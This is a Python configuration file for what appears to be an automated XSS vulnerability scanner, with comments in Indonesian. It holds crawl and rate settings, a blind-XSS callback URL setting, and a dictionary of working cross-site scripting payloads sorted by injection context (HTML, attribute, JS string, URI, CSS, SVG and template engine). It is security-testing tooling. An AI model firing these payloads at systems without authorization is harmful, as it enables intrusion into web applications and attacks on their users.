# config.py

from datetime import datetime
from pathlib import Path
from typing import Final

# --- Global Configuration ---
USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/115.0.0.0 Safari/537.36"
)
REQUEST_TIMEOUT: Final[int] = 15  # dalam detik
# Jittered delay antara request, dalam detik (min, max)
REQUEST_DELAY_MIN: Final[float] = 0.3
REQUEST_DELAY_MAX: Final[float] = 1.0

MAX_URLS_TO_CRAWL: Final[int] = 30
MAX_DEPTH_CRAWL: Final[int] = 6
MAX_WORKERS: Final[int] = 5

# --- Logging / Paths ---
LOG_DIR = Path("logs")
LOG_DIR.mkdir(parents=True, exist_ok=True)  # buat folder beserta parent kalau perlu
LOG_FILE = LOG_DIR / f"xsscanner_{datetime.now():%Y%m%d_%H%M%S}.log"

# --- Context-aware minimal payload seeds ---
# Dirancang ringkas tapi menutup mayoritas kasus umum; engine akan melakukan
# mutasi ringan & kontekstual secara terkontrol (bukan brute-force buta).
CONTEXT_MIN_PAYLOADS = {
    # HTML text nodes
    "html_tag": [
        "</textarea><svg onload=alert(1)>",
        # Polyglot ringan
        '"><svg/onload=alert(1)>',
    ],
    # Attribute contexts — engine akan memilih dq/sq/atau unquoted sesuai profil
    "attr_dq": ['" autofocus onfocus=alert(1) x="'],
    "attr_sq": ["' autofocus onfocus=alert(1) x='"] ,
    "attr_unquoted": ["onmouseover=alert(1) x=1"],
    # JS string (kedua kutip dicoba bergantian)
    "js_string_dq": ['";alert(1);//'],
    "js_string_sq": ["';alert(1);//"],
    # URL-based vectors
    "uri_scheme": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    # CSS vectors (umum)
    "css_url": [
        '<div style="background-image:url(javascript:alert(1))">x</div>',
    ],
    "css_expression": [
        '<p style="width:expression(alert(1))">x</p>',
    ],
    # SVG/MathML variatif
    "svg": [
        "<svg><script href=data:,alert(1) />",
        "<svg onload=alert(1)>",
    ],
    # Event handler image
    "event_handler": [
        "<img src=x onerror=alert(1)>",
    ],
    "polyglot": [
        '"--><svg/onload=alert(1)>',
        "'--><script>alert(1)</script><!--",
    ],
    "template_engine": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{this.constructor.constructor('alert(1)')()}}",
    ],
}

# --- OAST/Blind XSS base URL (override via ENV XSS_OOB_BASE_URL if not set here)
# Contoh: "https://oast.example/t" (tanpa slash akhir)
try:
    import os as _os
    OAST_BASE_URL = _os.getenv("OAST_BASE_URL") or _os.getenv("XSS_OOB_BASE_URL") or ""
except Exception:
    OAST_BASE_URL = ""

# --- Quality & Performance knobs ---
# Mutasi maksimal per konteks (payload seeds) sebelum scoring (per payload)
MAX_MUTATIONS_PER_CONTEXT: Final[int] = 12
# Batas total sequence payload per parameter (progressive)
MAX_SEQUENCE_TOTAL: Final[int] = 150
# Crawler "paralel" (jumlah halaman aktif) — memakai satu Playwright context (sesi terjaga)
CRAWLER_CONCURRENCY: Final[int] = 2
# Rate-limit minimal antar request/navigasi per origin (detik)
ORIGIN_MIN_DELAY: Final[float] = 0.35
# Playwright browser pool size for utils.fetch_dynamic_html (reduce cold start)
BROWSER_POOL_SIZE: Final[int] = 2
